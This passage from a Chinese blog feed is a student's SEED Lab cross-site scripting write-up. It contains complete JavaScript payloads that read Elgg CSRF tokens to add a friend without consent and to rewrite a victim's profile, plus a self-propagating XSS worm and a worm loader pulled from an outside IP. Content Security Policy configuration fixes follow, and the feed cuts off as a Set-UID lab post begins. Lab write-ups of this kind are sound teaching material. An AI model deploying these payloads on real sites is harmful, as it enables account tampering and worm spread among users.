friend.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> sendurl=...; <span class="comment">//FILL IN</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//Create and send Ajax request to add friend</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, sendurl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器中模拟添加好友的操作，打开http header liver，进行查看<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698673592232-f7b27970-20a9-4f13-8f0e-9658e33b7474.png#averageHue=%23faf7f4&clientId=u5f93e81f-25f4-4&from=paste&height=264&id=uX6Ok&originHeight=416&originWidth=514&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=79790&status=done&style=none&taskId=ue47094ab-b72a-47fb-905a-1fc63948263&title=&width=326.349221169724" alt="image.png"><br />放大查看：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698673815474-ad4c400a-118a-4920-a20a-45e0cd87f883.png#averageHue=%23e5e1e0&clientId=u5f93e81f-25f4-4&from=paste&height=185&id=u43ae931c&originHeight=292&originWidth=1465&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=51961&status=done&style=none&taskId=uc836731d-a7bd-4892-aaf3-d9a5c0cb926&title=&width=930.1587724000888" alt="image.png"><br />因此构造之后得到以下脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>; ➀</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>; ➁</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//Construct the HTTP request to add Samy as a friend.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span>+ts+token+ts+token; <span class="comment">//FILL IN</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//Create and send Ajax request to add friend</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, sendurl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到samy还没有好友<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699082479668-e46911fd-b401-443f-a9be-2da46cf1e3a9.png#averageHue=%23b6a48b&clientId=u4052aad0-eb39-4&from=paste&height=352&id=u359b7856&originHeight=555&originWidth=1201&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28167&status=done&style=none&taskId=u48392de9-f9af-4ce1-a985-f2d995b6870&title=&width=762.5397171689465" alt="image.png"></p><p>在Alice的页面添加该脚本，并保存<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699082553946-4d1389c1-f535-412d-977e-d87089030498.png#averageHue=%23fdfdfc&clientId=u4052aad0-eb39-4&from=paste&height=408&id=ub4e5e53d&originHeight=643&originWidth=1192&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=67601&status=done&style=none&taskId=ufecda23b-6fff-48fd-bb21-01407c5041e&title=&width=756.8254311951575" alt="image.png"><br />接着在Boby的主页上去搜索Samy，并查看Samy的profile。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699082662638-8f8688ab-bd2d-467f-9417-aa382988f2eb.png#averageHue=%23c9f6f8&clientId=u4052aad0-eb39-4&from=paste&height=528&id=uff2304ec&originHeight=832&originWidth=1207&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56028&status=done&style=none&taskId=u2e829cd1-cb0b-48c3-915d-77046514d17&title=&width=766.3492411514725" alt="image.png"></p><p>可以看到，在没有任何提示的情况下，Boby已经添加Samy为好友了。攻击成功！<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699082793960-d36abde2-6b40-4c94-9f97-e02ccb6eebd9.png#averageHue=%23fcfbfa&clientId=u4052aad0-eb39-4&from=paste&height=421&id=u0545304b&originHeight=663&originWidth=1197&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=110268&status=done&style=none&taskId=u5984a99b-f277-45b1-a0fe-b81c05980bc&title=&width=760.0000345139292" alt="image.png"></p><p><strong>Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?</strong><br>:::info<br><strong>答：这两行其实就是一种认证模式,，是为了防范CSRF攻击所采用的策略。正如浏览器中通常加的token一样。此处也是一种token来通过服务器验证的过程。该网站的Elgg服务器需要对用户认证，而这两行的代码就是绕过这中认证的过程，xss攻击中的代码是可以直接读时间戳timestamp以及秘密令牌secret ，直接自己构造处绕过验证的方式。</strong><br>:::</p><p><strong>Question 2: If the Elgg application only provide the Editor mode for the “About Me” fifield, you cannot switch to the Text mode, can you still launch a successful attack?</strong><br>:::info<br><strong>答：可以的。在文本编辑器中的话，会在之后转为HTML网页的时候对js代码的部分有所改变，即编辑器会向代码中添加格式化数据，这就破坏了代码的完整性，导致这种代码其实是无法正确当作js代码来正确在网页中执行的。但是，攻击者依然可以使用一个浏览器扩展来删除这些HTTP请求中的格式化数据，或使用其他客户端来发送请求，并非一定需要浏览器。</strong><br>:::</p><br /><a name="eihmw"></a>### **3.6 Task 5: Modifying the Victim’s Profifile**该Task是要求当用户访问Samy的profile的时候，自己的Profile遭受Samy的XSS攻击，使得自己主页的Profile被恶意攻击者（Samy）篡改。<br />与Task4类似，此时也是需要查看一下修改用户Profile是怎样一个HttpRequest的格式。<br />此处，随意修改一下profile，在开发者工具中查看这个过程的HttpRequest的情况。<br />可以看到，发送的HttpRequest是POST请求，请求的RequestURL是http://www.xsslabelgg.com/action/profile/edit。<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/35921061/1699083665762-9b5becc4-9606-4f8a-ac40-d34b712171ef.png#averageHue=%23fcfbfa&clientId=u4052aad0-eb39-4&from=paste&height=503&id=u61a952b9&originHeight=793&originWidth=1194&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=154418&status=done&style=none&taskId=u92660d25-6167-4284-ae0d-819ad7470c8&title=&width=758.0952725226663)<p>构建一个Script：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> userName=elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> guid=elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ts=elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> token=elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> updateMessage = <span class="string">&quot;Super Hacker!!!&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> content=<span class="string">&quot;__elgg_token=&quot;</span>+token+<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+ts+<span class="string">&quot;&amp;name=&quot;</span>+userName+<span class="string">&quot;&amp;description=&amp;accesslevel[description]=2&amp;briefdescription=&quot;</span>+updateMessage+<span class="string">&quot;&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=&quot;</span>+guid; </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>; <span class="comment">//FILL IN</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> samyGuid = <span class="number">59</span>;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span>(guid!=samyGuid)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将上述代码用于Samy的AboutMe字段，且在HTML模式下编辑，保存：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699089168639-0062c267-5663-439f-8182-ecd670a9ef5d.png#averageHue=%23fcfcfc&clientId=u4052aad0-eb39-4&from=paste&height=368&id=u73b96164&originHeight=579&originWidth=1183&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=75691&status=done&style=none&taskId=u05f264e5-5272-4f70-aeff-994f8868066&title=&width=751.1111452213686" alt="image.png"><br />然后登录Boby账户，目前个人简介部分是空的<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699084546159-700763b5-b7cd-40e3-b65a-a50596797871.png#averageHue=%23f5f2f1&clientId=u4052aad0-eb39-4&from=paste&height=483&id=u6bf35d83&originHeight=760&originWidth=1205&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=102161&status=done&style=none&taskId=u6d6d7e84-d17c-48ad-8d61-eda484beb76&title=&width=765.0793998239639" alt="image.png"><br />接着访问samy<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699089288434-e8a99eb1-4d65-4509-bdbe-c87e9fd49225.png#averageHue=%23fdfdfd&clientId=u4052aad0-eb39-4&from=paste&height=345&id=u0f2fe4ac&originHeight=676&originWidth=1179&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=57927&status=done&style=none&taskId=u0962c965-f419-4504-b132-922b4ca1a53&title=&width=602.4603271484375" alt="image.png"><br />回到Boby的Profile中，可以看到Boby的Profile的About me字段已经被恶意用户Samy篡改。攻击成功！<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699089312409-bbc8b063-c6c2-43bc-95d8-debd004fcb5f.png#averageHue=%23fdfbf9&clientId=u4052aad0-eb39-4&from=paste&height=399&id=ua519e5ae&originHeight=629&originWidth=1190&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=98310&status=done&style=none&taskId=u82bc32f8-ceee-4a52-a946-64a7a24302e&title=&width=755.5555898676489" alt="image.png"></p><p><em><strong>Question 3: Why do we need Line ➀? Remove this line, and repeat your attack. Report and explain your observation.</strong></em><br>:::info<br><strong>答：如果去掉后，在保存的过程中其实就是一次POST请求发送的过程，这个过程xss脚本同样会生效，因此攻击者自身的Profile也被篡改。</strong><br>:::<br><a name="ACxSD"></a></p><h3 id="3-7-Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#3-7-Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="3.7 Task 6: Writing a Self-Propagating XSS Worm"></a><strong>3.7 Task 6: Writing a Self-Propagating XSS Worm</strong></h3><p>这个 Task 实现脚本自身的复制传播。<br><a name="phVOl"></a></p><h4 id="3-7-1-link型蠕虫"><a href="#3-7-1-link型蠕虫" class="headerlink" title="3.7.1 link型蠕虫"></a>3.7.1 link型蠕虫</h4><p>其实Link就是把DOM型的蠕虫代码放到一个第三方服务器（可以是自己搭建的站点）上，然后script src 加载就行了，省很多事情，实验主要要求的是DOM型</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">&quot;http://xxx.xxx.xxx.xxx&quot;</span>/<span class="attr">xsscode.js</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="llKJS"></a></p><h4 id="3-7-2-DOM-Approach"><a href="#3-7-2-DOM-Approach" class="headerlink" title="3.7.2 DOM Approach"></a>3.7.2 DOM Approach</h4><p>编辑 Samy 的 profile，使其可以把自己赋值到别人的 profile 中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;worm&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> content=token + ts + userName +</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;&amp;description=&quot;</span> + wormCode + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;&amp;briefdescription=samy%20is%20my%20hero&amp;accesslevel[briefdescription]=2&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">            guid;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> samyGuid=<span class="number">59</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                                  <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放入samy的profile，保存<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699096804193-d88c7bcf-fe4e-4984-bb55-e3148805dd7e.png#averageHue=%23fcfcfc&clientId=u4052aad0-eb39-4&from=paste&height=372&id=ua9eb0859&originHeight=586&originWidth=1207&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=76400&status=done&style=none&taskId=u1aa6bae0-e601-4509-a55f-18d9052c9e5&title=&width=766.3492411514725" alt="image.png"></p><p>boby访问samy的profile，发现自己的主页被修改<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699096864051-582ff357-73f5-47d0-9a83-9fcb925158c4.png#averageHue=%23fdfbfa&clientId=u4052aad0-eb39-4&from=paste&height=427&id=u9a1d8aa9&originHeight=672&originWidth=1197&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=103064&status=done&style=none&taskId=ua7e8f84a-0baf-481b-966c-f77e1b258e1&title=&width=760.0000345139292" alt="image.png"></p><p>登录 alice 账号，查看 boby 的 profile，看到自己的 profile 已经被修改了<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699096946758-aa30d89e-6dc9-4685-9fe5-85cc65d4f115.png#averageHue=%23ddbd98&clientId=u4052aad0-eb39-4&from=paste&height=286&id=u01e11860&originHeight=451&originWidth=1191&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=38102&status=done&style=none&taskId=ud7249218-9f4d-4fc5-bf45-631188a743e&title=&width=756.1905105314032" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699096967352-b2bba081-49e8-4596-bb31-6f2c1c157e62.png#averageHue=%23fdfcf9&clientId=u4052aad0-eb39-4&from=paste&height=380&id=uf8948732&originHeight=598&originWidth=1204&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=94432&status=done&style=none&taskId=u88c0ce53-20f3-44c2-83e4-38e3ee96653&title=&width=764.4444791602095" alt="image.png"></p><p><a name="eVzWR"></a></p><h3 id="3-8-Task-7-Defeating-XSS-Attacks-Using-CSP"><a href="#3-8-Task-7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="3.8 Task 7: Defeating XSS Attacks Using CSP"></a><strong>3.8 Task 7: Defeating XSS Attacks Using CSP</strong></h3><blockquote><ol><li>Describe and explain your observations when you visit these websites.</li><li>Click the button in the web pages from all the three websites, describe and explain your observations.</li><li>Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.</li><li>Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.</li><li>Please explain why CSP can help prevent Cross-Site Scripting attacks.</li></ol></blockquote><p>这个 Task 探究 CSP 防御 XSS 的作用。原始状态为<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699097859803-33d1c877-1398-4c21-a0f9-dd7d05e863f7.png#averageHue=%23989897&clientId=u4052aad0-eb39-4&from=paste&height=294&id=u16e1a8dd&originHeight=579&originWidth=1204&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=55945&status=done&style=none&taskId=u4810657f-ebf1-450c-9688-8754d8f0567&title=&width=611.0119018554688" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699098296453-2352d34a-d610-4da7-bd40-78c4e8fc872d.png#averageHue=%23f9f8f8&clientId=u4052aad0-eb39-4&from=paste&height=233&id=u6fdeac85&originHeight=357&originWidth=956&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36936&status=done&style=none&taskId=uea7a2bc7-f28c-40ae-bd6d-7518cb0fcae&title=&width=622.984130859375" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699098326601-5b63a8ad-8052-4957-a498-122f28cd5b51.png#averageHue=%23fbfaf9&clientId=u4052aad0-eb39-4&from=paste&height=222&id=u82a61491&originHeight=353&originWidth=997&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=38100&status=done&style=none&taskId=u9cea5dcb-2ead-41f7-b8cb-5f6c7886e58&title=&width=627" alt="image.png"></p><p>修改 apache_csp.conf：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Purpose: Setting CSP policies in Apache configuration</span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">DocumentRoot /var/www/csp</span><br><span class="line">ServerName www.example32b.com</span><br><span class="line">DirectoryIndex index.html</span><br><span class="line">Header set Content-Security-Policy &quot; \</span><br><span class="line">default-src &#x27;self&#x27;; \</span><br><span class="line">script-src &#x27;self&#x27; *.example60.com \</span><br><span class="line">script-src &#x27;self&#x27; *.example70.com \</span><br><span class="line">&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699100324737-d3517db7-c94e-41f2-9129-9409bbe31b06.png#averageHue=%23fbfaf9&clientId=u4052aad0-eb39-4&from=drop&height=254&id=ue0b25b89&originHeight=367&originWidth=826&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30390&status=done&style=none&taskId=u8bb167d3-b517-493d-97c1-341636708f6&title=&width=572.4603271484375" alt="4f42c5f94fd1f09cce906d32feb4d28.png"></p><p>修改 phpindex.php：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">    $cspheader = &quot;Content-Security-Policy:&quot;.</span></span><br><span class="line"><span class="meta">     &quot;default-src &#x27;self&#x27;;&quot;.</span></span><br><span class="line"><span class="meta">     &quot;script-src &#x27;self&#x27; &#x27;nonce-111-111-111&#x27; &#x27;nonce-222-222-222&#x27; *.example60.com *.example70.com&quot;.</span></span><br><span class="line"><span class="meta">    header($cspheader);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php include &#x27;index.html&#x27;;?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699100246981-d00e65fa-c9fb-445f-bb26-bc8fb6820f92.png#averageHue=%23fbfaf9&clientId=u4052aad0-eb39-4&from=drop&height=296&id=ue9c8d82d&originHeight=374&originWidth=736&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=29718&status=done&style=none&taskId=uca9c0ba1-7bd2-47b3-a426-d558e63be4a&title=&width=583.4603271484375" alt="fc61fd84524500ce96ffb436a06af3c.png"></p><p>显然的，CSP 就是白名单制度，明确告诉客户端，哪些外部资源可以加载和执行。</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：环境变量&amp;set-uid实验</title>
      <link href="/post/21aa1c74.html"/>
      <url>/post/21aa1c74.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="1    实验内容"></a>1    实验内容</h1><p>本实验室的学习目标是让学生了解环境变量如何影响程序以及系统行为。环境变量是一组动态命名值，可以影响正在运行的进程将在计算机上运行。大多数操作系统都使用它们，因为它们是1979年引入Unix。尽管环境变量会影响程序行为，但它们是如何实现的这一点很多程序员都不太理解。因此，如果程序使用环境变量程序员不知道它们被使用，程序可能有漏洞。</p><p>在本实验室中，学生将了解环境变量是如何工作的，它们是如何从父进程到子进程，以及它们如何影响系统&#x2F;程序行为。我们特别感兴趣的是如何环境变量影响Set-UID程序的行为，这些程序通常是特权程序。<br><a name="vg0k9"></a></p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><p><a name="vTOH6"></a></p><h2 id="2-1-Task-1-Manipulating-Environment-Variables"><a href="#2-1-Task-1-Manipulating-Environment-Variables" class="headerlink" title="**2.1 **Task 1: Manipulating Environment Variables"></a>**2.1 **Task 1: <strong>Manipulating Environment Variables</strong></h2><p>使用printenv命令查看PATH环境变量，env |grep PWD命令过滤输出环境变量<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698216973526-07a9b388-838c-4866-83b5-63ac9b1acac7.png#averageHue=%23292625&clientId=u364b3a35-d487-4&from=paste&height=86&id=u1dd27f1f&originHeight=135&originWidth=470&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18782&status=done&style=none&taskId=u36881a4a-88b0-41e1-8bda-a7d13fb19a3&title=&width=298.4127119645336" alt="image.png"><br />再使用export “Myname&#x3D;Enboy” 设置环境变量Myname为Enboy，此时查看环境变量，可以找到名为Myname的环境变量如下<br /><img 